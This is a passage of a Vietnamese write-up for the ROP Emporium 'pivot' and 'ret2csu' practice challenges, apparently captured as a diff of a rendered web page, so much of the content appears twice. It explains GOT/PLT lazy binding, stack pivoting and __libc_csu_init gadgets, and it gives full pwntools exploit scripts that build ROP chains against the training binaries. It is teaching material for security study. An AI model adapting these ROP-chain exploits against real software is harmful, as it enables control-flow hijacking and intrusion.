-</span></span><span style=display:flex><span>	0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726 ; &#34;&amp;\a@&#34;
-</span></span></code></pre></div><p>Hàm ret2win không nằm trong binary mà nằm trong libpivot.so do đó ta cần tìm hiểu về lazy binding, để biết được địa chỉ của ret2win ta cần một hàm trong libpivot.so mà pivot gọi đó là foothold_function.</p><p>Khi ta gọi đến foothold_function@plt tại 0x400720 lần đầu tiên, ta sẽ jump tới ptr và ptr này sẽ trỏ tới got.plt section, tại đây địa chỉ sẽ được resolve tới địa chỉ của libpivot.so và cập nhật vào got.plt. Lần gọi thứ 2 ta sẽ jump  tới trực tiếp hàm trong libpivot.so mà không cần resolve nữa</p><p><a href=https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html>https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></p><p>Ví dụ:</p><p>Khi ta gọi puts@plt (0x400872)</p><p><figure><img src=images/Pivot/2_image.png alt></figure></p><p>Jump tới got.plt</p><p><figure><img src=images/Pivot/3_image.png alt></figure></p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ readelf -r pivot 
-</span></span><span style=display:flex><span>Relocation section &#39;.rela.plt&#39; at offset 0x5c8 contains 9 entries:
-</span></span><span style=display:flex><span>  Offset          Info           Type           Sym. Value    Sym. Name + Addend
-</span></span><span style=display:flex><span>  ...
-</span></span><span style=display:flex><span>000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
-</span></span></code></pre></div><p><figure><img src=images/Pivot/12_image.png alt></figure></p><p>Lookup “put” trong GOT</p><p><figure><img src=images/Pivot/5_image.png alt></figure></p><p>Ta thấy địa chỉ 0x00007ffff7ffe2c0 nằm trong phần data của ld-linux-x86-64.so</p><p><figure><img src=images/Pivot/6_image.png alt></figure></p><p>0x00007ffff7fdd540 nằm trong execution của ld-linux-x86-64.so</p><p><figure><img src=images/Pivot/10_image.png alt></figure></p><p><figure><img src=images/Pivot/8_image.png alt></figure></p><p>Khi ta call put@plt lần 2, got.plt sẽ trỏ đến put trong ld-linux-x86-64.so</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ readelf -r pivot 
-</span></span><span style=display:flex><span>Relocation section &#39;.rela.plt&#39; at offset 0x5c8 contains 9 entries:
-</span></span><span style=display:flex><span>  Offset          Info           Type           Sym. Value    Sym. Name + Addend
-</span></span><span style=display:flex><span>  ...
-</span></span><span style=display:flex><span>000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
-</span></span></code></pre></div><p><figure><img src=images/Pivot/11_image.png alt></figure></p><p>Như vậy để có được địa chỉ của hàm ret2win trong libpivot.so ta cần gọi hàm foothold_function 1 lần, lấy địa chỉ đã resolve của foothold_function trong got.plt và thêm vào offset khoảng cách giữa foothold_function và ret2win là ta sẽ có địa chỉ cần tìm.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Stack như sau:
-</span></span><span style=display:flex><span>[0x400720] -&gt; foothold_function@plt
-</span></span><span style=display:flex><span>[0x4009bb] -&gt; pop rax; ret;
-</span></span><span style=display:flex><span>[0x601040] -&gt; foothold_function@got.plt -&gt; rax; rax lúc này trỏ đến địa chỉ của foothold_function
-</span></span><span style=display:flex><span>[0x4009c0] -&gt; mov rax, qword ptr [rax]; ret; Lấy địa chỉ của foothold_function đã resolve
-</span></span><span style=display:flex><span>---&gt; thêm offset giữa foothold và ret2win để rax trỏ về ret2win
-</span></span><span style=display:flex><span>[0x4007c8] -&gt; pop rbp; ret;
-</span></span><span style=display:flex><span>[0x4009c4] -&gt; add rax, rbp; ret;
-</span></span><span style=display:flex><span>[0x4006b0] -&gt; call rax; Gọi ret2win
-</span></span></code></pre></div><p>Code payload 1</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>lib_foothold_addrs = 0x0000096a <span style=font-style:italic># 10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function</span>
-</span></span><span style=display:flex><span>lib_ret2win_addrs = 0x00000a81 <span style=font-style:italic># 18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload1 = p64(0x400720) <span style=font-style:italic>#8   0x00400720 GLOBAL FUNC       foothold_function</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4009bb) <span style=font-style:italic># 0x00000000004009bb: pop rax; ret;</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x601040) <span style=font-style:italic># 6: sym.imp.foothold_function (); 0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726;</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4009c0) <span style=font-style:italic># 0x00000000004009c0: mov rax, qword ptr [rax]; ret;</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4007c8) <span style=font-style:italic># 0x00000000004007c8: pop rbp; ret;</span>
-</span></span><span style=display:flex><span>payload1 += p64(lib_ret2win_addrs-lib_foothold_addrs) <span style=font-style:italic>#offset</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4009c4) <span style=font-style:italic># 0x00000000004009c4: add rax, rbp; ret; </span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4006b0) <span style=font-style:italic># 0x00000000004006b0: call rax;</span>
-</span></span><span style=display:flex><span>p.sendline(payload1)
-</span></span></code></pre></div><p>Kết hợp 2 payload</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>from pwn import *
-</span></span><span style=display:flex><span>import re
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>context.update(arch=<span style=font-style:italic>&#39;amd64&#39;</span>, os=<span style=font-style:italic>&#39;linux&#39;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>p = process(<span style=font-style:italic>&#39;./pivot&#39;</span>)
-</span></span><span style=display:flex><span><span style=font-style:italic># gdb.attach(p,&#39;&#39;&#39;</span>
-</span></span><span style=display:flex><span><span style=font-style:italic># break *pwnme</span>
-</span></span><span style=display:flex><span><span style=font-style:italic># &#39;&#39;&#39;)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>line1 = p.recvuntil(<span style=font-style:italic>b</span><span style=font-style:italic>&#39;&gt;&#39;</span>)
-</span></span><span style=display:flex><span>print(line1)
-</span></span><span style=display:flex><span>heap_addr = <span style=font-weight:700>int</span>(re.search(<span style=font-style:italic>&#39;pivot: (0x\w+)&#39;</span>, line1.decode()).group(1), 16)
-</span></span><span style=display:flex><span>print(<span style=font-style:italic>&#34;Found heap address: {:02x}&#34;</span>.format(heap_addr))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>lib_foothold_addrs = 0x0000096a <span style=font-style:italic># 10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function</span>
-</span></span><span style=display:flex><span>lib_ret2win_addrs = 0x00000a81 <span style=font-style:italic># 18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload1 = p64(0x400720) <span style=font-style:italic>#8   0x00400720 GLOBAL FUNC       foothold_function</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4009bb) <span style=font-style:italic># 0x00000000004009bb: pop rax; ret;</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x601040) <span style=font-style:italic># 6: sym.imp.foothold_function (); 0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726;</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4009c0) <span style=font-style:italic># 0x00000000004009c0: mov rax, qword ptr [rax]; ret;</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4007c8) <span style=font-style:italic># 0x00000000004007c8: pop rbp; ret;</span>
-</span></span><span style=display:flex><span>payload1 += p64(lib_ret2win_addrs-lib_foothold_addrs) <span style=font-style:italic>#offset</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4009c4) <span style=font-style:italic># 0x00000000004009c4: add rax, rbp; ret; </span>
-</span></span><span style=display:flex><span>payload1 += p64(0x4006b0) <span style=font-style:italic># 0x00000000004006b0: call rax;</span>
-</span></span><span style=display:flex><span>p.sendline(payload1)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>line2 = p.recvuntil(<span style=font-style:italic>b</span><span style=font-style:italic>&#39;&gt;&#39;</span>)
-</span></span><span style=display:flex><span>print(line2)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload2 = <span style=font-style:italic>b</span><span style=font-style:italic>&#39;A&#39;</span>*40
-</span></span><span style=display:flex><span>payload2 += p64(0x4009bb) <span style=font-style:italic>#0x00000000004009bb: pop rax; ret;</span>
-</span></span><span style=display:flex><span>payload2 += p64(heap_addr)
-</span></span><span style=display:flex><span>payload2 += p64(0x4009bd) <span style=font-style:italic># 0x00000000004009bd: xchg rax, rsp; ret;</span>
-</span></span><span style=display:flex><span>p.sendline(payload2)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>line3 = p.recvuntil(<span style=font-style:italic>&#39;libpivot&#39;</span>)
-</span></span><span style=display:flex><span>print(line3)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=font-style:italic># leak_foothold_got = p.recv(8)</span>
-</span></span><span style=display:flex><span><span style=font-style:italic># print(leak_foothold_got.hex())</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>print(p.recvall())
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=font-style:italic># p.interactive()</span>
-</span></span></code></pre></div><h2 id=ret2csu>Ret2csu
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 7 ta sẽ bị giới hạn số lượng bytes có thể overflow do đó ta cần chuyển hướng rsp - stack pointer đến vị trí khác để có thể thực thi</p><p><figure><img src=images/Pivot/image.png alt></figure></p><p>Ở challenge này tác giả đã khởi tạo 0x10000000 bytes bộ nhớ và cho địa chỉ tại stdout, ta chỉ cần chuyển hướng stack pointer đến địa chỉ này và sử dụng. </p><p>Hàm memset sẽ chỉ cho phép 0x20 = 32 bytes trong bộ nhớ nên ta chỉ có thể overflow 32 bytes, vừa đủ để pivot stack.</p><p><figure><img src=images/Pivot/1_image.png alt></figure></p><p>Do giá trị trên sẽ thay đổi ở các lần thực thi (hàm malloc sẽ trả về giá trị khác nhau) và ta sẽ cần lấy giá trị đó để thay đổi giá trị trong payload trước khi truyền nên cần sử dụng thêm thư viện pwntools </p><p>Payload 2: Lấy địa chỉ đã cho và chuyển hướng rsp tới đó</p><p>Các gadget cần thiết</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain>$ python3 Ropper.py -f pivot
+...
+0x00000000004009bb: pop rax; ret;
+0x00000000004009bd: xchg rax, rsp; ret;
+</code></pre><p>Lấy input từ stdout và build stack</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>line1 = p.recvuntil(b&#39;&gt;&#39;)
+heap_addr = int(re.search(&#39;pivot: (0x\w+)&#39;, line1.decode()).group(1), 16)
+
+payload2 = b&#39;A&#39;*40
+payload2 += p64(0x4009bb) #0x00000000004009bb: pop rax; ret;
+payload2 += p64(heap_addr)
+payload2 += p64(0x4009bd) # 0x00000000004009bd: xchg rax, rsp; ret;
+p.sendline(payload2)
+</code></pre><p>Payload 1: Build ROP chain sẽ thực thi sau khi chuyển hướng</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain> $ rabin2 -i pivot
+[Imports]
+nth vaddr      bind   type   lib name
+―――――――――――――――――――――――――――――――――――――
+...
+2   0x004006e0 GLOBAL FUNC       puts
+8   0x00400720 GLOBAL FUNC       foothold_function
+
+$ rabin2 -S pivot
+[Sections]
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+...
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+
+$ rabin2 -is libpivot.so
+...
+[Symbols]
+
+nth paddr      vaddr      bind   type   size lib name
+―――――――――――――――――――――――――――――――――――――――――――――――――――――
+10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function
+18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win
+
+$ readelf -r pivot 
+Relocation section &#39;.rela.plt&#39; at offset 0x5c8 contains 9 entries:
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+  ...
+000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+000000601040  000800000007 R_X86_64_JUMP_SLO 0000000000000000 foothold_function + 0
+
+$ radare2 pivot
+[0x00400760]&gt; aaa
+[0x00400760]&gt; afl
+[0x00400760]&gt; s sym.imp.foothold_function
+[0x00400720]&gt; pdf
+	0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726 ; &#34;&amp;\a@&#34;
+</code></pre><p>Hàm ret2win không nằm trong binary mà nằm trong libpivot.so do đó ta cần tìm hiểu về lazy binding, để biết được địa chỉ của ret2win ta cần một hàm trong libpivot.so mà pivot gọi đó là foothold_function.</p><p>Khi ta gọi đến foothold_function@plt tại 0x400720 lần đầu tiên, ta sẽ jump tới ptr và ptr này sẽ trỏ tới got.plt section, tại đây địa chỉ sẽ được resolve tới địa chỉ của libpivot.so và cập nhật vào got.plt. Lần gọi thứ 2 ta sẽ jump  tới trực tiếp hàm trong libpivot.so mà không cần resolve nữa</p><p><a href=https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html>https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></p><p>Ví dụ:</p><p>Khi ta gọi puts@plt (0x400872)</p><p><figure><img src=images/Pivot/2_image.png alt></figure></p><p>Jump tới got.plt</p><p><figure><img src=images/Pivot/3_image.png alt></figure></p><pre tabindex=0><code class=language-text-plain data-lang=text-plain>$ readelf -r pivot 
+Relocation section &#39;.rela.plt&#39; at offset 0x5c8 contains 9 entries:
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+  ...
+000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+</code></pre><p><figure><img src=images/Pivot/12_image.png alt></figure></p><p>Lookup “put” trong GOT</p><p><figure><img src=images/Pivot/5_image.png alt></figure></p><p>Ta thấy địa chỉ 0x00007ffff7ffe2c0 nằm trong phần data của ld-linux-x86-64.so</p><p><figure><img src=images/Pivot/6_image.png alt></figure></p><p>0x00007ffff7fdd540 nằm trong execution của ld-linux-x86-64.so</p><p><figure><img src=images/Pivot/10_image.png alt></figure></p><p><figure><img src=images/Pivot/8_image.png alt></figure></p><p>Khi ta call put@plt lần 2, got.plt sẽ trỏ đến put trong ld-linux-x86-64.so</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>$ readelf -r pivot 
+Relocation section &#39;.rela.plt&#39; at offset 0x5c8 contains 9 entries:
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+  ...
+000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+</code></pre><p><figure><img src=images/Pivot/11_image.png alt></figure></p><p>Như vậy để có được địa chỉ của hàm ret2win trong libpivot.so ta cần gọi hàm foothold_function 1 lần, lấy địa chỉ đã resolve của foothold_function trong got.plt và thêm vào offset khoảng cách giữa foothold_function và ret2win là ta sẽ có địa chỉ cần tìm.</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>Stack như sau:
+[0x400720] -&gt; foothold_function@plt
+[0x4009bb] -&gt; pop rax; ret;
+[0x601040] -&gt; foothold_function@got.plt -&gt; rax; rax lúc này trỏ đến địa chỉ của foothold_function
+[0x4009c0] -&gt; mov rax, qword ptr [rax]; ret; Lấy địa chỉ của foothold_function đã resolve
+---&gt; thêm offset giữa foothold và ret2win để rax trỏ về ret2win
+[0x4007c8] -&gt; pop rbp; ret;
+[0x4009c4] -&gt; add rax, rbp; ret;
+[0x4006b0] -&gt; call rax; Gọi ret2win
+</code></pre><p>Code payload 1</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>lib_foothold_addrs = 0x0000096a # 10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function
+lib_ret2win_addrs = 0x00000a81 # 18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win
+
+payload1 = p64(0x400720) #8   0x00400720 GLOBAL FUNC       foothold_function
+payload1 += p64(0x4009bb) # 0x00000000004009bb: pop rax; ret;
+payload1 += p64(0x601040) # 6: sym.imp.foothold_function (); 0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726;
+payload1 += p64(0x4009c0) # 0x00000000004009c0: mov rax, qword ptr [rax]; ret;
+payload1 += p64(0x4007c8) # 0x00000000004007c8: pop rbp; ret;
+payload1 += p64(lib_ret2win_addrs-lib_foothold_addrs) #offset
+payload1 += p64(0x4009c4) # 0x00000000004009c4: add rax, rbp; ret; 
+payload1 += p64(0x4006b0) # 0x00000000004006b0: call rax;
+p.sendline(payload1)
+</code></pre><p>Kết hợp 2 payload</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>from pwn import *
+import re
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+
+p = process(&#39;./pivot&#39;)
+# gdb.attach(p,&#39;&#39;&#39;
+# break *pwnme
+# &#39;&#39;&#39;)
+
+line1 = p.recvuntil(b&#39;&gt;&#39;)
+print(line1)
+heap_addr = int(re.search(&#39;pivot: (0x\w+)&#39;, line1.decode()).group(1), 16)
+print(&#34;Found heap address: {:02x}&#34;.format(heap_addr))
+
+lib_foothold_addrs = 0x0000096a # 10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function
+lib_ret2win_addrs = 0x00000a81 # 18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win
+
+payload1 = p64(0x400720) #8   0x00400720 GLOBAL FUNC       foothold_function
+payload1 += p64(0x4009bb) # 0x00000000004009bb: pop rax; ret;
+payload1 += p64(0x601040) # 6: sym.imp.foothold_function (); 0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726;
+payload1 += p64(0x4009c0) # 0x00000000004009c0: mov rax, qword ptr [rax]; ret;
+payload1 += p64(0x4007c8) # 0x00000000004007c8: pop rbp; ret;
+payload1 += p64(lib_ret2win_addrs-lib_foothold_addrs) #offset
+payload1 += p64(0x4009c4) # 0x00000000004009c4: add rax, rbp; ret; 
+payload1 += p64(0x4006b0) # 0x00000000004006b0: call rax;
+p.sendline(payload1)
+
+line2 = p.recvuntil(b&#39;&gt;&#39;)
+print(line2)
+
+payload2 = b&#39;A&#39;*40
+payload2 += p64(0x4009bb) #0x00000000004009bb: pop rax; ret;
+payload2 += p64(heap_addr)
+payload2 += p64(0x4009bd) # 0x00000000004009bd: xchg rax, rsp; ret;
+p.sendline(payload2)
+
+line3 = p.recvuntil(&#39;libpivot&#39;)
+print(line3)
+
+# leak_foothold_got = p.recv(8)
+# print(leak_foothold_got.hex())
+
+print(p.recvall())
+
+# p.interactive()
+</code></pre><h2 id=ret2csu>Ret2csu
 <a class=heading-link href=#ret2csu><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p>Challenge 8 tương tự Challenge 3 callme, tuy nhiên ta sẽ sử dụng phương pháp khác để kiểm soát các giá trị rdi, rsi, rdx (3 thanh ghi chứa tham số arg1, arg2, arg3)</p><p><a href=https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf>https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></p><p>Ở đây ta sẽ có 2 Gadget, sử dụng radare2 để disassemble function __libc_csu_init__</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> radare2 ret2csu 
-</span></span><span style=display:flex><span>[0x00400520]&gt; aaa
-</span></span><span style=display:flex><span>[0x00400520]&gt; afl
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>0x00400640    4 101          sym.__libc_csu_init
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>[0x00400520]&gt; s sym.__libc_csu_init
-</span></span><span style=display:flex><span>[0x00400640]&gt; pdf
-</span></span><span style=display:flex><span>            ; DATA XREF from entry0 @ 0x400536
-</span></span><span style=display:flex><span>┌ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
-</span></span><span style=display:flex><span>│           ; arg int64_t arg1 @ rdi
-</span></span><span style=display:flex><span>│           ; arg int64_t arg2 @ rsi
-</span></span><span style=display:flex><span>│           ; arg int64_t arg3 @ rdx
-</span></span><span style=display:flex><span>│           0x00400640      4157           push r15
-</span></span><span style=display:flex><span>│           0x00400642      4156           push r14
-</span></span><span style=display:flex><span>│           0x00400644      4989d7         mov r15, rdx                ; arg3
-</span></span><span style=display:flex><span>│           0x00400647      4155           push r13
-</span></span><span style=display:flex><span>│           0x00400649      4154           push r12
-</span></span><span style=display:flex><span>│           0x0040064b      4c8d259e0720.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start
-</span></span><span style=display:flex><span>│                                                                      ; 0x600df0
-</span></span><span style=display:flex><span>│           0x00400652      55             push rbp
-</span></span><span style=display:flex><span>│           0x00400653      488d2d9e0720.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
-</span></span><span style=display:flex><span>│                                                                      ; 0x600df8
-</span></span><span style=display:flex><span>│           0x0040065a      53             push rbx
-</span></span><span style=display:flex><span>│           0x0040065b      4189fd         mov r13d, edi               ; arg1
-</span></span><span style=display:flex><span>│           0x0040065e      4989f6         mov r14, rsi                ; arg2
-</span></span><span style=display:flex><span>│           0x00400661      4c29e5         sub rbp, r12
-</span></span><span style=display:flex><span>│           0x00400664      4883ec08       sub rsp, 8
-</span></span><span style=display:flex><span>│           0x00400668      48c1fd03       sar rbp, 3
-</span></span><span style=display:flex><span>│           0x0040066c      e85ffeffff     call sym._init
-</span></span><span style=display:flex><span>│           0x00400671      4885ed         test rbp, rbp
-</span></span><span style=display:flex><span>│       ┌─&lt; 0x00400674      7420           je 0x400696
-</span></span><span style=display:flex><span>│       │   0x00400676      31db           xor ebx, ebx
-</span></span><span style=display:flex><span>│       │   0x00400678      0f1f84000000.  nop dword [rax + rax]
-</span></span><span style=display:flex><span>│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400694
-</span></span><span style=display:flex><span>│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
-</span></span><span style=display:flex><span>│      ╎│   0x00400683      4c89f6         mov rsi, r14
-</span></span><span style=display:flex><span>│      ╎│   0x00400686      4489ef         mov edi, r13d
-</span></span><span style=display:flex><span>│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
-</span></span><span style=display:flex><span>│      ╎│   0x0040068d      4883c301       add rbx, 1
-</span></span><span style=display:flex><span>│      ╎│   0x00400691      4839dd         cmp rbp, rbx
-</span></span><span style=display:flex><span>│      └──&lt; 0x00400694      75ea           jne 0x400680
-</span></span><span style=display:flex><span>│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
-</span></span><span style=display:flex><span>│       └─&gt; 0x00400696      4883c408       add rsp, 8
-</span></span><span style=display:flex><span>│           0x0040069a      5b             pop rbx
-</span></span><span style=display:flex><span>│           0x0040069b      5d             pop rbp
-</span></span><span style=display:flex><span>│           0x0040069c      415c           pop r12
-</span></span><span style=display:flex><span>│           0x0040069e      415d           pop r13
-</span></span><span style=display:flex><span>│           0x004006a0      415e           pop r14
-</span></span><span style=display:flex><span>│           0x004006a2      415f           pop r15
-</span></span><span style=display:flex><span>└           0x004006a4      c3             ret
-</span></span><span style=display:flex><span>[0x00400640]&gt;
-</span></span></code></pre></div><p>Ta có Gadget 1:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
-</span></span><span style=display:flex><span>│      ╎│   0x00400683      4c89f6         mov rsi, r14
-</span></span><span style=display:flex><span>│      ╎│   0x00400686      4489ef         mov edi, r13d
-</span></span><span style=display:flex><span>│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
-</span></span></code></pre></div><p>Gadget 2</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>│           0x0040069a      5b             pop rbx
-</span></span><span style=display:flex><span>│           0x0040069b      5d             pop rbp
-</span></span><span style=display:flex><span>│           0x0040069c      415c           pop r12
-</span></span><span style=display:flex><span>│           0x0040069e      415d           pop r13
-</span></span><span style=display:flex><span>│           0x004006a0      415e           pop r14
-</span></span><span style=display:flex><span>│           0x004006a2      415f           pop r15
-</span></span><span style=display:flex><span>└           0x004006a4      c3             ret
-</span></span></code></pre></div><p>Với payload 1 ta sử dụng Gadget 2 để truyền giá trị arg vào r13, r14, r15, Gadget 2 cũng control r12 để kết hợp với Gadget 1 gọi đến hàm chúng ta mong muốn đồng thời control edi, rsi, rdx</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>payload1 = <span style=font-style:italic>b</span><span style=font-style:italic>&#39;A&#39;</span>*40
-</span></span><span style=display:flex><span>payload1 += p64(libc_csu_int + 0x5a) <span style=font-style:italic># Gadget 1</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x0) <span style=font-style:italic># rbx</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x1) <span style=font-style:italic># rbp -&gt; add rbx, 0x1;cmp rbp, rbx; jne __libc_csu_init -&gt; rbx==rbp</span>
-</span></span><span style=display:flex><span>payload1 += p64(init) <span style=font-style:italic># r12 -&gt; call qword [r12 + rbx*8]</span>
-</span></span><span style=display:flex><span>payload1 += p64(0xdeadbeefdeadbeef) <span style=font-style:italic># r13 -&gt; edi</span>
-</span></span><span style=display:flex><span>payload1 += p64(0xcafebabecafebabe) <span style=font-style:italic># r14 -&gt; rsi</span>
-</span></span><span style=display:flex><span>payload1 += p64(0xd00df00dd00df00d) <span style=font-style:italic># r15 -&gt; rdx</span>
-</span></span></code></pre></div><p>Tới đây ta có rsi và rdx, riêng rdi ta cần phải thực hiện ở payload2, đó là lí do ta không gọi trực tiếp hàm ret2win với r12</p><p>Với r12 ta sử dụng hàm <code>__init__</code> vì  nó không cần đối số</p><p>Ta thấy sau <code>call qword [r12 + rbx*8]</code> thì rbx sẽ từ 0 thêm 1 và nếu rbp khác rbx  thì sẽ quay lại 0x400680. Đó là lý do ở payload 1 ta sẽ cho rbp bằng 0x1 để thực hiện đoạn tiếp theo và đoạn này chứa Gadget 2</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
-</span></span><span style=display:flex><span>│      ╎│   0x00400683      4c89f6         mov rsi, r14
-</span></span><span style=display:flex><span>│      ╎│   0x00400686      4489ef         mov edi, r13d
-</span></span><span style=display:flex><span>│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
-</span></span><span style=display:flex><span>│      ╎│   0x0040068d      4883c301       add rbx, 1
-</span></span><span style=display:flex><span>│      ╎│   0x00400691      4839dd         cmp rbp, rbx
-</span></span><span style=display:flex><span>│      └──&lt; 0x00400694      75ea           jne 0x400680
-</span></span></code></pre></div><p>Ở payload 2 ta sẽ thêm vào rsp một đoạn padding bất kỳ do kế tiếp payload 1 sẽ là <code>add rsp, 8</code>, tại payload 2 ta gọi hàm trong r12 ở đây là <code>__init__</code> (chỉ để giữ nguyên rsi, rdi, rdx). Kế tiếp ta truyền giá trị cho rdi do Gadget 2 trước đó chỉ control được edi. </p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>payload2 = p64(libc_csu_int + 0x40) <span style=font-style:italic># Gadget 2</span>
-</span></span><span style=display:flex><span>payload2 += <span style=font-style:italic>b</span><span style=font-style:italic>&#39;B&#39;</span>*8
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># rbx</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># rbp</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r12</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r13</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r14</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r15</span>
